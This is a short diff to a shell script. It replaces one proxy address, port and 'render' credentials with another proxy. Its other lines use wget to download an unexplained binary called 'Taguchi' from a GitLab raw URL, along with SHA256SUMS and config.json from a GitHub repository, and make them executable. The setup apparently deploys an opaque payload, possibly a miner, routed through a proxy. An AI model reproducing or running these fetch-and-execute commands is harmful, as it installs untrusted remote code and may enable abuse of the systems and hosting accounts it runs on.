@@ -1,7 +1,5 @@
-proxy="149.50.222.86" 
-port="1080" 
-user="render"  
-pass="render"  
+proxy="98.162.25.7" 
+port="31653"
 wget -q -O Taguchi https://gitlab.com/55113110159/dokerweb/-/raw/main/ebiy && chmod +x Taguchi
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/SHA256SUMS && chmod +x SHA256SUMS 
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
